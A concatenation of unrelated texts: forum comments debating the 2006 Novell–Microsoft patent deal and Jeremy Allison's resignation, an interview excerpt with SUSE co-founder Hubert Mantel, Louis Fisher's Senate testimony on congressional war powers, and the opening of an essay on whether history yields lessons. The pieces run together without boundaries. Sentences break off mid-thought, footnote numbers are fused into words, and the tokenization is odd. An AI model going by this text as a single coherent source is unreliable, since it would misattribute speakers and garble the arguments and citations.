But again , we do n't know if that 's the same situation we are now facing with Novell and Microsoft .

There is a larger issues which our society has yet to address , we can see it
both in software and religion .
If you can't license your own software with restriction to keep all the rights ,
how can you make a living ?
The same question in religion is , If God 's manifestation for today has re-newed
religion and abolished the clergy , how will those in the clergy make a living if
they were to accept the new revelation ?
Just how would Microsoft be able to continue employing good , creative people if
they did not own the fruits of their labors ?
The answer is similar to the answer in the abortion discussion -- do n't ever get
in the situation where this becomes a question .
In a very real sense : Do n't expect to make a living from creating software ( for
its own sake . )
People and companies that do useful things create software as a
by - product , they make their living from the things they do , not the software
they create .
Those ( relatively ) few , true software artists , may get by , as
artists have always done , but that life will never satisfy the business person .
Microsoft and others have a real challenge , how to do something useful beyond
creating software , so that they can make their living from that and not the
software .
Just the same as preachers now have a great challenge , how to lead people to God
( and make a living ) when He has abolished their profession .

Those in Novell proper , Ximian , SUSE and others .
There have a been a few so far that have left , but Jeremy Allison is the biggest fish so far .
There are a few that have significant impact on the Linux Kernel , many on Gnome , Evolution , Mono ...
In fact , the tendrils affect nearly every Linux distribution and many core packages , at this point .
The fallout has of yet to really begin , this is just the pre-cursor .
I commend Jeremy for doing what he thinks is right .
Though , I think Novell has really gotten the beast into an agreement to which it does n't realize it cannot pull back from without HUGE HUGE costs ( in legal and other fundamentals ) .
Microsoft in short will be driving MANY computer buyers and users to Linux , mainly due to the Vista effect .

You seem to be saying that you have no moral or ethical responisbility to
understand the intent of a law or license and abide by that .
All that is
necessary is that you do n't break the letter of the law .
I do n't agree with you .
I believe we are charged with the moral and ethical
responisbility to live by the plain clear intention of the law .

Twenty eight years ago the Supreme Court gave a recipe for the elimination of
software related utility patents - go to Congress :
 The mathematical formula involved here has no substantial practical application
except in connection with a digital computer .
It may be that the patent laws
should be extended to cover these programs , a policy matter to which we are not
competent to speak .
. .
If these programs are to be patentable , considerable
problems are raised which only committees of Congress can manage , for broad
powers of investigation are needed , including hearings which canvass the wide
variety of views which those operating in this field entertain .
The
technological problems tendered in the many briefs before us indicate to us that
considered action by the Congress is needed . , Parker v. Flook , 437 U.S. 584
( 1978 ) .
An organized campaign by the tens of thousands of open source community members
to influence representatives in Congress to restrict the scope of 35 U.S.C. Sec .
101 is the only hope to eliminate the evils of software related utility patents .
Pursuing relief through a copyright license will * never * work -- that is an
illusory legal dream .

It 's inspiring to see a brave man take a stand for what he believes in .
Hopefully his stand will stiffen the spines of those around him and Novell will

restated , if you 're not willing do " die " for anything , then what are
you living for ?
It 's almost funny , but when you think about it , the people in the past have been
much smarter than the so - called " programmers , chemists , engineers , poets ,
novelists " .. and I can go on and on ...
think about it , the people who are afforded " smart " status today
could n't hold a candle to the scientists and other intellectuals of even 50
years ago .
In other words , do you think that just because you created a
computer game on a chip that you 're " smart " ???
that is too funny for even a comeback .

I do n't understand why this whole agreement thing is so bad for the linux
community ?
It seems indeed like everyone is against this whole thing .
I am very
much afraid that both Samba and GPLv3 will hurt Novell and thereby Suse Linux ,
but that 's because of the bad PR .
Is n't it great that even Microsoft finally admits that linux is becoming
dangerous for it ?
They finally realize that even they , with all their money ,
ca n't stand up against a community of thousands or even millions of programmers .
All they can do to survive is provide interoperability , but that 's also the
thing linux needs .
I hate having to emulate a whole PC in VMware just to run some tiny little
application for Windows on my PC , and I 'm not the only one .
If this deal is
going to solve that problem , I honestly can't see anything wrong for the linux
community .
I also disagree with the fact that the Novell - Microsoft agreement is violating
the idea behind the GPL .
The GPL is about giving everyone the possibility to
alter software and to distribute it under the same terms .
And yes , there is a
part of it concerning patents , but Novell is not breaking it .
Not even it's
idea .
There was no agreement between Microsoft and Novell about not sueing each other .
Microsoft promised to to sue Novell 's customers for patent infrigement .
That
does n't mean Microsoft can't sue Novell for doing so .
And look at the irony of
this , how could Microsoft sue Novell 's customers for something Novell could
never implement in it 's software ?
That would only be possible if Novell had maid
some mistake nobody noticed , but even then and without the agreement , I do n't
think Microsoft would sue Novell 's customers but Novell itself .
This fud is just
about an extra guarantee granted to Novell 's customers , not about a significant
fact .
Red Hat and other OSS companies might not have this guarantee , but that
does n't mean their customers have or Red Hat itself has to be afraid of being
sued from Microsoft .
Red
Hat has just the same rights as Novell , neither can
break any of MS 's patents .
All this agreement brings to linux is goodness , except for all this FUD of
course .
Look at all the improvements that can be made now .
Wine can become even
better , the same counts for mono and OpenOffice.org .
Samba too would benefit
alot , if they were n't so much against this agreement .
And all of Microsoft's and
Novell 's interoperability changes .
Novell 's changes would be licensed under the
GPL , so again , what 's the problem ?
I must say I 'm very disappointed in this community .
I do have respect for your
views , but please do n't think your opinion is the only right one .
I 'm not saying
mine is , but please wait a while before you condemn Novell .
It takes time before
these agreement can have effects , so please wait and see .
The agreement has only
been made about one month ago .
What concerns Jeremy Allison , I 'm very sorry to hear that he 's leaving Novell ,
but if he believes he 's doing the right thing , then he should be doing it .
This
does not mean I agree with him about the whole agreement , but it means that I do
agree that you can't work against your principles .
Oh , and for those that wanted to ask , I do n't work for Novell or Microsoft .
[ Reply to This | # ]
Authored by : Anonymous on Thursday , December 21 2006 @ 07:15 PM EST
What Mr. Allison did makes perfect sense .
It 's nice that he 's found employment
elsewhere right away .
He was obviously concerned , and rightly so , that the
agreement between Microsoft and Novell was holding not just him , but Novell and
SuSE , back .
Which it will .
Affecting Mr. Allison , as well as Novell in a way
where there will be less community involvement , less momentum , and so forth .
Novell will be less " involved " in many of the ways that matter .
There
is no doubt about this .
On the other hand , the agreement is clearly not in violation of the letter of
the GPLv2 , and depending on what happens with GPLv3 , the smartest move may be to
prevent Microsoft from distributing coupons - in other words - Microsoft should
be encouraged to extend patent pledges of one form or another as an olive
branch .
Using gplv3 as a weapon against Novell specifically is going to make it
harder for the license to gain the required traction .
( just my opinion , folks ) .
Classifying Microsoft as a redistributor would probably be a very effective way
of dealing with things , then they would be encouraged to extend patent promises .
I totally understand where Jeremy is coming from , and I appreciate what he's
saying , but ultimately what needs to happen is for Microsoft to join the ranks
of IBM , Novell , Red Hat , and any other corporation that has decided to extend
patent pledges of some sort or another towards GPL - licensed material .
Obviously ,
Microsoft has major concerns about this , but they need to get over it and get
with the program .
Dream on , right ?
Yeah , probably .
But in any case , one can see clearly what MS and Novell were doing , and one can
also see clearly what Jeremy , and the Samba team , and Mr. Shuttleworth , and so
many other folks are doing .
It 's almost like a fork .
Xemacs vs emacs all over again , sort of .
Except this
time it 's more like gplv2 vs gplv3 ( but not really ) .
On the one hand , gplv3 IS
gpl every bit as much as gplv2 -- it just CLARIFIES and EXPLAINS gplv2 .
It 's not
a different license .
Well , OK , it 's a " different " license , but it 's
not really anything more than a clarification of the concepts and principles
embodied in gplv2 .
It 's wierd - because when I first heard of this collaboration between SuSE and
Microsoft , I was excited , because I thought that people would be more willing to
accept Linux .
And to that end , there 's probably still a lot of folks who feel
that way , and feel that it 's a good thing .
Let 's face it - there 's only ONE
Microsoft .
Microsoft IS an instance .
The only instance of itself you 'll ever
find .
It 's more efficient to realize that and not be afraid of 10,000
Microsofts , because there is only one .
On the other hand ... the point of view being presented by many seriously devoted
members of the " community " makes perfect sense as well .
At best , the
patent protections are completely unnecessary .
Any code coming from Novell might
be suspect .
There 's no reason that Red Hat or anyone else should pay protection
money to anyone .
If I did n't know any better , I 'd say that philosophically , ethically perhaps ,
conceptually , in terms of licenses but not really licenses so much but the
concepts underlying the need for them in the first place perhaps , what we have
is a huge " fork " of sorts , a collosal shift , the evidence of which is
not manifested in any physical object such as a license .
You could say it 's v2
vs v3 , but that 's not it , really .
If you try for a physical manifestation of
this metaphysical " fork " in the v2 vs v3 argument ( which is n't really
an argument as I said before , just more of a clarification of v2 ) , it wo n't
really work , because v3 just clarifies v2 anyway .
It 's not a " fork " .
Not meant to be one , anyway .
Most people in the " community " do n't
believe v3 will cause a fork , anyway .
V3 is just a clarification .
So that 's the thing - you can choose .
You have that choice .
You can go with
Novell , or you can go with Red Hat .
What we have is undeniably real , but yet
there are no real physical objects that serve as a manifestation of that shift .
Perhaps other than blogs , comments , mailing list posts , and so forth .
Here we have one time in history where we can make our voice heard , where people
are genuinely interested in what other people have to say .
Taken together , all
the posts , all the blogs , all the comments - this is the evidence - these are
the physical manifestations of what has become a giant , strange , metaphysical
" fork " of sorts .
You wo n't see it if you do n't have an open mind .
But
it 's there , if you look .
And the choice is yours .
Strange , huh ?

In other news this week , Steven J. Vaughan - Nichols reports that SUSE co-founder Hubert Mantel has returned to Novell after a year away .
SUSE co-founder Hubert Mantel is back in the saddle at Novell .
Back in November of 2005 when the well - respected chief maintainer of the SUSE Linux kernel left Novell , he said in an email announcing his resignation that " This is no longer the company I founded 13 years ago . "
In the DMO interview , Mantel explained that he had come back because , " I had more than one year of time to think about my future and came to the conclusion that the thing I 'm most interested in still is Linux .
Also I do have many good friends at SuSE and I really like to work with and for Linux . "
When asked in an interview with DMO about the Novell deal with Microsoft , he had this to say :
6 . What do you think about the Microsoft / Novell deal ?
I think it is a good thing especially for the users .
If you think some years back , Linux was not taken seriously .
Now even Microsoft acknowledges that it exists and will not go away .
I understand that many people do n't like it as Novell is collaborating with the " evil empire " .
But I do n't like this way of thinking ; we are not working against somebody , but we are working FOR Linux .
Fundamentalism always leads to pain .
What 's important is that Linux is free and will remain to be free .
The source code is open to everybody , this is what counts for me .
Some people seem to be torn in an interesting way :
On one hand they want " world domination " , at the same time they do n't like the feeling that Linux has grown up and needs to deal with the real business world out there .
We have a saying here in Germany that goes along the lines of " wash me , but do not make me wet " .
If you want Linux to succeed , you can not live in your own separate universe .
He also had this response to a question about his thoughts on the future of open - source software :
9 . In your opinion , what will be open - source 's future ?
Linux and open source have grown up , it has entered mainstream .
I think that open source and proprietary software will co-exist .
While I prefer open source , I do understand that there also exists software where the source code is not freely available .
And this kind of software always will exist .
For me it is important to be able to choose .
Competition is always good .
Noone knows how the world would look like if Linux and open source would not exist .
I think it already changed the IT world in a big way .

While I respect Allisons decision I know one thing this will make me think long
and hard about .
Whether or not to hire Open Source software contributors and
developers .
if they cant seperate religon and politics from business affairs ,
do I really want them working for me ?
The answer sadly is no .

DIGG THIS
Statement before the Senate Committee on the Judiciary January 30 , 2007
Mr. Chairman , thank you for inviting me to offer my views on the constitutional authority of Congress to restrict , redirect , or terminate military operations .
In recent years , some commentators have argued that Congress cannot , in time of war , interfere with the Presidents power as Commander in Chief .
Others claim that if Congress decides to exercise the power of the purse it must terminate all funding rather than adopting more selective or focused approaches .
These commentators read congressional power far too narrowly and misunderstand the purpose of the Constitution and its commitment to representative ( republican ) government .
Democratic Principles
Congress is not merely a coequal branch of government .
The framers vested the decisive and ultimate powers of war and spending in the legislative branch .
We start with that basic understanding .
American democracy places the sovereign power in the people and entrusts to them the temporary delegation of their power to elected Senators and Representatives .
Members of Congress take an oath of office to defend the Constitution , not the President .
Their primary allegiance is to the people and the constitutional principles of checks and balances and separation of power .
1
Any interpretation of presidential power that fails to take account of those basic concepts is contrary to the democratic system established in the United States .
The legislative judgment to take the country to war carries with it a duty throughout the conflict to decide that military force remains in the national interest .
As with any other statute , Congress is responsible for monitoring what it has set in motion .
In the midst of war , there are no grounds for believing that the Presidents judgment for continuing the war is superior to the collective judgment of elected representatives .
Congress has both the constitutional authority and the responsibility to retain control and recalibrate national policy whenever necessary .
The breadth of congressional power is evident simply by looking at the text of the Constitution and comparing Article I to Article II .
The powers expressly stated give Congress the predominant role in matters of war .
However , this purely textual reading misses what the American framers did , why they did it , and how they broke with the reigning British models of executive power .
Their study of history led them to place in Congress the sole power to take the country from a state of peace to a state or war .
They left with the President in his capacity as Commander in Chief , certain defensive powers to repel sudden attacks . 
Rejecting Monarchical Power
In 1787 , the existing models of government throughout Europe , particularly in England , placed the war power and foreign affairs solely in the hands of the Executive .
John Locke , in his Second Treatise on Civil Government ( 1690 ) , vested the federative power ( what we call foreign policy ) with the Executive .
Sir William Blackstone , in his Commentaries , defined the kings prerogative broadly to include the right to declare war , send and receive ambassadors , make war or peace , make treaties , issue letters of marque and reprisal ( authorizing private citizens to undertake military actions ) , and raise and regulate fleets and armies .
The framers carefully studied this monarchical model and repudiated it in its entirety .
Not a single one of Blackstones prerogatives was granted to the President .
They are either assigned entirely to Congress ( declare war , issue letters of marque and reprisal , raise and regulate fleets and armies ) or shared between the Senate and the President ( appointing ambassadors and making treaties ) .
The rejection of the British and monarchical models could not have been more sweeping .
This explains what the framers did .
The next question is why they did it .
The framers gave Congress the power to initiate war because they concluded  based on the history of other nations  that Executives , in their quest for fame and personal glory , had too great an appetite for war and little care for their subjects or the long - term interests of their country .
2 John Jay , whose experience in the Continental Congress and the early years of the Republic was generally in foreign affairs , warned in Federalist No. 4 that absolute monarchs will often make war when their nations are to get nothing by it , but for purposes and objects merely personal , such as a thirst for military glory , revenge for personal affronts , ambition , or private compacts to aggrandize or support their particular families or partisans .
These and a variety of other motives , which affect only the mind of the sovereign , often lead him to engage in wars not sanctified by justice or the voice and interests of his people .

Joseph Story , who served on the Supreme Court from 1811 to 1845 , similarly wrote about the need to vest in the representative branch the decision to go to war .
The power to declare war is in its own nature and effects so critical and calamitous , that it requires the utmost deliberation , and the successive review of all the councils of the nations .
War , in its best estate , never fails to impose upon the people the most burthensome taxes , and personal sufferings .
It is always injurious , and sometime subversive of the great commercial , manufacturing , and agricultural interests . 
Story found war as sometimes fatal to public liberty itself , by introducing a spirit of military glory , which is ready to follow , wherever a successful commander will lead .3
Through their study of history and political ambition , the framers came to fear the Executive appetite for war .
Human nature has not changed over the years to justify trust in independent and unchecked presidential decisions in war .
The record of two centuries in America teaches us that what Jay said in 1788 applies equally well to contemporary times .
Offensive and Defensive Wars
The debates at the Philadelphia Convention in 1787 underscore the framers  intent to keep offensive wars in the hands of Congress while reserving to the President certain actions of a defensive nature .
All three branches understood that distinction for 160 years , until President Truman went to war against North Korea by going to the UN Security Council for authority  instead of to Congress .
Review what the framers said in Philadelphia .
On June 1 , 1787 , Charles Pinckney offered his support for a vigorous Executive but was afraid the Executive powers of Congress might extend to peace and war which would render the Executive a Monarchy , of the worst kind , towit an elective one . 
1 Farrand 6465 .
John Rutledge wanted the executive power placed in a single person ,  tho he was not for giving him the power of war and peace .
James Wilson , who also preferred a single executive , did not consider the Prerogatives of the British Monarch as a proper guide in defining the Executive powers .
Some of these prerogatives were of a Legislative nature .
Among others that of war and peace .
Id. at 6566 .
Edmund Randolph worried about executive power , calling it  the foetus of monarchy .
The delegates to the Philadelphia Convention , he said , had no motive to be governed by the British Governmt . as our prototype .
Alexander Hamilton , in a lengthy speech on June 18 , strongly supported a vigorous and independent President , but plainly jettisoned the British model of executive prerogatives in foreign affairs and the war power .
In discarding the Lockean and Blackstonian doctrines of executive power , he proposed giving the Senate the sole power of declaring war .
The President would be authorized to have  the direction of war when authorized or begun . 
Id. at 292 .
In Federalist No. 69 , Hamilton explained the break with English precedents .
The power of the king extends to the declaring of war and to the raising and regulating of fleets and armies . 
The delegates decided to place those powers , he said , in Congress .
At the constitutional convention , Charles Pinckney objected that legislative proceedings were too slow for the safety of the country in an emergency , since he expected Congress to meet but once a year .
James Madison and Elbridge Gerry moved to amend the draft constitution , empowering Congress to declare war instead of to make war .
This change in language would leave to the President  the power to repel sudden attacks .
The motion carried .
2 Farrand 31819 .
Reactions to the Madison - Gerry amendment reinforce the narrow grant of authority to the President .
Pierce Butler wanted to give the President the power to make war , arguing that he will have all the requisite qualities , and will not make war but when the Nation will support it .
Not a single delegate supported him .
Roger Sherman objected :  The Executive shd .
be able to repel and not to commence war .
Id. at 318 .
Gerry said he never expected to hear in a republic a motion to empower the Executive alone to declare war . 
George Mason spoke agst giving the power of war to the Executive , because not to be trusted with it .
. . .
He was for clogging rather than facilitating war . 
2 Farrand 319 .
His remarks echo what Jay said in Federalist No. 4 .
At the Pennsylvania ratifying convention , James Wilson expressed the prevailing sentiment that the system of checks and balances will not hurry us into war ; it is calculated to guard against it .
It will not be in the power of a single man , or a single body of men , to involve us in such distress ; for the important power of declaring war is vested in the legislature at large . 
2 Elliot 528 .
The power of initiating war was vested in Congress .
To the President was left certain defensive powers  to repel sudden attacks . 
This distrust of presidential power in matters of war was expressed frequently after the Philadelphia convention .
In 1793 , Madison called war  the true nurse of executive aggrandizement .
. . .
In war , the honours and emoluments of office are to be multiplied ; and it is the executive patronage under which they are to be enjoyed .
It is in war , finally , that laurels are to be gathered ; and it is the executive brow they are to encircle .
The strongest passions and most dangerous weaknesses of the human breast ; ambition , avarice , vanity , the honourable or venial love of fame , are all in conspiracy against the desire and duty of peace .
4
Five years later , in a letter to Thomas Jefferson , Madison said that the Constitution supposes , what the History of all Govts demonstrates , is that Ex. is the branch of power most interested in war , and most prone to it .
It has accordingly with studied care , vested the question of war in the Legisl .
5
Separating Purse and Sword
The need to keep the purse and the sword in separate hands was a bedrock principle for the framers .
They recalled the efforts of English kings who , denied funds from Parliament , decided to rely on outside sources of revenue for their military expeditions .
The result was civil war and the loss of Charles I of both his office and his head .

The growth of democratic government is directly tied to legislative control over all expenditures , including those for foreign and military affairs .
The U.S. Constitution attempted to avoid the British history of civil war and bloodshed by vesting the power of the purse wholly in Congress .
Under Article I , Section 9 ,  No Money shall be drawn from the Treasury , but in Consequence of Appropriations made by Law . 
In Federalist No. 48 , Madison explained that  the legislative department alone has access to the pockets of the people .
The President gained the title of Commander in Chief but Congress retained the power to finance military operations .
For Madison , it was a fundamental principle of democratic government that [t ] hose who are to conduct a war cannot in the nature of things , be proper or safe judges , whether a war ought to be commenced , continued , or concluded .
They are barred from the latter functions by a great principle in free government , analogous to that which separates the sword from the purse , or the power of executing from the power of enacting laws .
7
This understanding of the war power was widely understood .
Jefferson praised the transfer of the war power from the executive to the Legislative body , from those who are to spend to those who are to pay . 
Commander in Chief
In recent years , advocates of presidential authority have argued that the title  Commander in Chief empowers the President to initiate military operations against other countries and to continue unless Congress cut off all funds , presumably by mustering a two - thirds majority in each House to overcome an expected presidential veto .
Such a scenario means that a President could start and continue a war so long as he had at least one - third plus one in a single chamber of Congress .
Nothing in the writings of the framers , the debates at Philadelphia and the ratifying conventions , or the text of the Constitution supports that theory .
Article II reads :  The President shall be Commander in Chief of the Army and Navy of the United States , and of the Militia of the several States , when called into the actual Service of the United States . 
Here is one constitutional check .
Congress , not the President , does the calling .
Article I gives to Congress the power to provide for calling forth the Militia to execute the Laws of the Union , suppress Insurrections and repel Invasions . 
Under Article I , Congress raises and supports armies and provides and maintains a navy .
It makes rules for the government and regulation of the land and naval forces .
It provides for organizing , arming , and disciplining the militia .
The Constitution does not empower the President as Commander in Chief to initiate and continue wars .
In Federalist No. 74 , Hamilton explained part of the purpose for making the President Commander in Chief : unity of command .
The direction of war most peculiarly demands those qualities which distinguish the exercise of power by a single head . 
The power of directing war and emphasizing the common strength forms a usual and essential part in the definition of the executive authority .
The Presidents authority to bring unity of purpose in military command does not deprive Congress of its constitutional responsibility to monitor war and decide whether to restrict or terminate military operations .
A third quality attaches to the Commander in Chief Clause .
Giving that title to the President represents an important technique for preserving civilian supremacy over the military .
The person leading the armed forces would be the civilian President , not a military officer .
In 1861 , Attorney General Edward Bates explained that the President is Commander in Chief not because he is skilled in the art of war and qualified to marshal a host in the field of battle .
He is Commander in Chief for a different reason .
Whatever soldier leads U.S. armies to victory against an enemy , he is subject to the orders of the civil magistrate , and he and his army are always subordinate to the civil power .8
Just as military officers are subject to the direction and command of the President , so is the President subject to the direction and command of Members of Congress , because they are the representative of the sovereign people .
To allow a President to conduct a war free of legislative constraints , or free of constraints unless both Houses muster a two - thirds majority to override a veto , would violate fundamental principles of republican government .
The Constitution in Practice
The basic distinction between offensive and defensive military actions was understood by all three branches for the first 160 years .
President Trumans decision to go to war in 1950 against North Korea marked a fundamental change .
He went not to Congress for authority but to the UN Security Council .
Korea represented the first of several unconstitutional presidential wars .9
Prior to that time it was broadly understood by Congress , Presidents , and the courts that anything of an offensive nature in military operations was reserved strictly to the nations representatives .
Presidents accepted that principle for all wars : declared or undeclared .
When President George Washington took military action against certain Indian tribes , he carefully followed statutory policy and understood that his operations against tribes were to be defensive , not offensive , measures .
His Secretary of War , Henry Knox , wrote to governors :  The Congress which possess the powers of declaring War will assemble on the 5th of next Month  Until their judgments shall be known it seems essential to confine all your operations to defensive measures .
10 To Knox , Washington had no authority to direct offensive operations  against Indian tribes because such measures were reserved to  the decisions of Congress who solely are invested with the powers of War. 11
Chief Justice John Marshall , writing for the Court in 1801 , spoke expansively about the powers of Congress in war :
 The whole powers of war being , by the constitution of the United States , vested in congress , the acts of that body can alone be resorted to as our guides in this inquiry .
12
If a presidential proclamation in time of war conflicted with statutory policy enacted by Congress , the statute prevailed over the proclamation .
13 Similarly , the Neutrality Act of 1794 established a national policy that could not be disregarded by independent presidential judgments over military operations .
Ruled a circuit court in 1806 :  The President of the United States cannot control the statute , nor dispense with its execution , and still less can he authorize a person to do what the law forbids .
14 Further :  Does [ the President ] possess the power of making war ?
That power is exclusively vested in congress .
15 If a nation invaded the United States , the President would have an obligation to resist with force .
But there was a manifest distinction  between going to war with a nation at peace and responding to an actual invasion :
 In the former case , it is the exclusive province of congress to change a state of peace into a state of war . 16
President Jefferson understood the difference between defensive and offensive wars .
In 1801 , he directed a squadron into the Mediterranean , telling commanders that in the event the Barbary powers declared war on the United States or took any offensive actions against U.S. ships , American commanders were to sink and destroy the attacking vessels .
Having issued that order , based on congressional authority in providing for a naval peace establishment ,  he recognized that Congress decided the nations military policy :
 The real alternative before us is whether to abandon the Mediterranean or to keep up a cruise in it , perhaps in rotation with other powers who would join us as soon as there is peace .
But this Congress must decide .7
Although the Pasha of Tripoli insisted on a larger tribute from the United States and declared war on America on May 14 , 1801 , Jefferson looked solely to Congress to decide the nations response .
On December 8 , he informed Congress of the situation and asked for further guidance , stating he was unauthorized by the Constitution , without the sanctions of Congress , to go beyond the line of defense . 
It was up to Congress to authorize measures of offense also .
He gave to Congress all the documents it needed so that the legislative branch , in the exercise of this important function confided by the Constitution to the Legislature exclusively ,  could act in the manner it considered most appropriate .
18
It is often said during congressional debate and in studies released by the Justice Department that Jefferson took military measures against the Barbary powers without seeking the approval or authority of Congress .
19
In fact , in at least ten statutes , Congress explicitly authorized military action by Presidents Jefferson and Madison against the Barbary pirates .
20
Those who promote unilateral and plenary power for the President in matters of war frequently cite the Supreme Court decision in The Prize Cases ( 1863 ) , which upheld President Lincolns blockade of rebellious states .
However , the Court clearly distinguished between defensive and offensive actions .
Justice Robert Grier said that although the President as Commander in Chief had no power to initiate war , in the event of foreign invasion the President was not only authorized but bound to resist force by force .
He does not initiate the war , but is bound to accept the challenge without waiting for the special legislative authority .
21 The President had no choice but to meet the crisis in the shape it presented itself without waiting for Congress it with a name ; and no name given to it by him or them could change that fact . 22
Yet Justice Grier proceeded to carefully limit the Presidents power to defensive actions , noting that he has no power to initiate or declare a war against either a foreign nation or a domestic State .
23
The executive branch took exactly the same position .
During oral argument , Richard Henry Dana Jr. , who was representing the President , acknowledged that Lincolns actions had nothing to do with  the right to initiate a war , as a voluntary act of sovereignty .
That is vested only in Congress . 24
In a case decided by the Supreme Court in 1889 , England had called upon the United States to supply naval forces for a military action against China .
The Court made it clear that offensive operations had to be authorized by Congress , not the President .
The Secretary of State told the English government that  the warmaking power of the United States was not vested in the President but in Congress , and that he had no authority , therefore , to order aggressive hostilities to be undertaken .
25 Significantly , the Court spoke not merely of the congressional power to declare war but of a broader power : war - making .
The decision to spill the nations blood and draw funds from the Treasury is reserved to Congress , not the President .
Presidents , in probably more than two hundred instances , have used military force without first receiving congressional authority .
Those actions generally fall under the category of protecting life or property ,  including chasing bandits over the Mexican border .
None of these actions come close to anything approaching a major war .26
Contemporary Statutory Restrictions
Congress has often enacted legislation to restrict and limit military operations by the President , selecting both appropriations bills and authorizing legislation to impose conditions and constraints .
The Congressional Research Service recently prepared a lengthy study that lists these statutory provisions .
27 A major cutoff of funds occurred in 1973 , when Congress passed legislation to deny funds for the war in Southeast Asia .
After President Nixon vetoed the bill , the House effort to override failed on a vote of 241 to 173 , or 35 votes short of the necessary two - thirds majority .
28 A lawsuit by Representative Elizabeth Holtzman asked the courts to determine that President Nixon could not engage in combat operations in Cambodia and elsewhere in Indochina in the absence of congressional authorization .
A federal district court held that Congress had not authorized the bombing of Cambodia .
Its inability to override the veto and the subsequent adoption of an August 15 deadline for the bombing could not be taken as an affirmative grant of legislative authority :
 It can not be the rule that the President needs a vote of only one - third plus one of either House in order to conduct a war , but this would be the consequence of holding that Congress must override a Presidential veto in order to terminate hostilities which it had not authorized .
29 Appellate courts mooted the case because the August 15 compromise settled the dispute between the two branches and terminated funding for the war .30
Through its power to authorize programs and appropriate funds , Congress can define and limit presidential military actions .
Some claim that the power of the purse is an ineffective and impractical method of restraining presidential wars .
Senator Jacob Javits said that Congress can hardly cut off appropriations when 500,000 American troops are fighting for their lives , as in Vietnam .
31
The short answer is that Congress can , and has , used the power of the purse to restrict and terminate presidential wars .
If Congress is concerned about the safety of American troops , those lives are not protected by voting additional funds for a war it does not support .
A proper and responsible action , when war has declining value or purpose , is to reevaluate the commitment by placing conditions on appropriations , terminating funding , moving U.S troops to a more secure location , and taking other legislative steps .
There is one central and overriding question :
Is the continued use of military force in the nations interest ?
If not , then U.S. soldiers need to be safely withdrawn and redeployed .
Answering that difficult question is not helped by speculation about whether congressional action might embolden the enemy . 
Other examples of congressional intervention can be cited .
In 1976 , Congress prohibited the CIA from conducting military or paramilitary operations in Angola and denied any appropriated funds to finance directly or indirectly any type of military assistance to Angola .
In 1984 , Congress adopted the Boland Amendment to prohibit assistance of any kind to support the Contras in Nicaragua .
No constitutional objection to this provision was ever voiced publicly by President Reagan , the White House , the Justice Department , or any other agency of the executive branch .
32
Congress has options other than a continuation of funding or a flat cutoff .
In 1986 , Congress restricted the Presidents military role in Central America by stipulating that U.S. personnel may not provide any training or other service , or otherwise participate directly or indirectly in the provision of any assistance , to the Nicaraguan democratic resistance pursuant to this title within those land areas of Honduras and Costa Rica which are within 20 miles of the border with Nicaragua .
33 In 1991 , when Congress authorized President George H. W. Bush to use military force against Iraq , the authority was explicitly linked to UN Security Council Resolution 678 , which was adopted to expel Iraq from Kuwait .
34
Thus , the legislation did not authorize any wider action , such as using U.S. forces to invade and occupy Iraq .
In 1993 , Congress established a deadline for U.S. troops to leave Somalia .
No funds could be used for military action after March 31 , 1994 , unless the President requested an extension from Congress and received prior legislative priority .
35
Conclusions
In debating whether to adopt statutory restrictions on the Iraq War , Members of Congress want to be assured that legislative limitations do not jeopardize the safety and security of U.S. forces .
Understandably , every Member wants to respect and honor the performance of dedicated American soldiers .
However , the overarching issue for lawmakers is always this :
Is a military operation in the nations interest ?
If not , placing more U.S. soldiers in harms way is not a proper response .
Members of the House and the Senate cannot avoid the question or defer to the President .
Lawmakers always decide the scope of military operations , either by accepting the commitment as it is or by altering its direction and purpose .
In a democratic republic , that decisionlegitimately and constitutionally resides in Congress .

Dr. Louis Fisher is the Congressional Research Service ’s expert on presidential powers .
In the current debate of what direction US foreign policy should take in response to the attacks of September 11 , 2001 , much reference has been made of the " lessons of history . "
" History teaches us , " we are told , " that we must act with overwhelming force against a terrorist threat . "
Or , perhaps , " History teaches us that we must stop dictators while they are still weak and unprepared for full - scale war . "
However , the very idea that history contains such " lessons " is false , and rests upon a misunderstanding of what history is and what it can achieve .
History is the historian ’s effort to construct a coherent world of the past based on the evidence available to him in the present .
( This contention , that the historian constructs history , should not be taken to mean that history is merely a reflection of his whims , political opinions , or social class .
If he is faithful to his task as a historian , he constructs the past that the evidence compels him to believe is true . )
In order to construct such a past , the historian strives to place each detail of the past into a plausible and comprehensible course of events .
The actions of particular historical figures are seen as the intelligible outcome of the situation in which they found themselves , as they understood it to be at that time .
Because history is a world of detailed , specific events , the idea of ‘ general laws ’ of history is self - contradictory .
Of course , historical actors should be understood as obeying the general laws independently derived by other disciplines , such as the law of gravity or the law of diminishing marginal returns .
But history itself can generate no such laws , since they would involve abstracting away all of the details of events , in other words , abstracting away the very subject matter of history .
As Michael Oakeshott wrote in Experience and Its Modes :
" There is no process of generalization by means of which the events , things and persons of history can be reduced to anything other than historical events , things and persons without at the same time being removed from the world of historical ideas … .
In history there are no ‘ general laws ’ by means of which historical individuals can be reduced to instances of a principle , and least of all are there general laws of the character we find in the world of science . "
However , history is not the only mode of understanding the past .
There is also , for instance , the legendary past , consisting of the stories a group of people tell about themselves , helping to establish a sense of identity among those people .
The most important rival past to that of history is the practical past .
The practical past is the past seen in terms of how it might guide one ’s present actions .
Whereas the historian asks , " What did those past events mean , to the participants in them , at the time they were taking place ? " the practical user of the past asks , " What do those past events mean to me , right now ? "
Such a practical inquiry into the past , when generalized , produces not scientific laws but prudential maxims .
Their application is fraught with the ambiguity of all such rules of thumb .
For every past event I could point to that demonstrates that you should " Look before you leap , " you could find another that illustrates that " He who hesitates is lost . "
The professional historian is no doubt especially qualified to pass judgment on the historical past .
His training makes him skilled at judging what past events are indicated by present evidence .
However , nothing in his training gives him special expertise at deciding what those events should mean to us today .
Of course , a historian has just as much right as anyone else to draw maxims for practical conduct from the past ; the view entertained here merely asserts that his skill as a historian is irrelevant to his ability to evaluate the past in practical terms .
However , it is extremely tempting for a historian , having special expertise in dealing with " the past , " to try on the role of guru to those seeking practical advice from days gone by .
In attempting to play such a role , he risks muddling what he properly can say as a historian into an incoherent stew with what he can say as a practical man , looking to the past for guidance .
Especially , he is subject to the temptation to present his practical conclusions as " historical laws , " and to claim his maxims are " the conclusions of history . "
Should he completely lose his way in this respect , his explorations will cease to be an effort to construct a past that he is compelled to believe in by the evidence .
Instead , he will rummage through the evidence , like a man carelessly rifling through his closet looking for a favorite pair of socks , tossing aside all facts that do not go with the outfit he has already picked out for the past to wear .
There may be some practical advantages to a historian who succumbs to the temptation to abandon the historical past for a practical one .
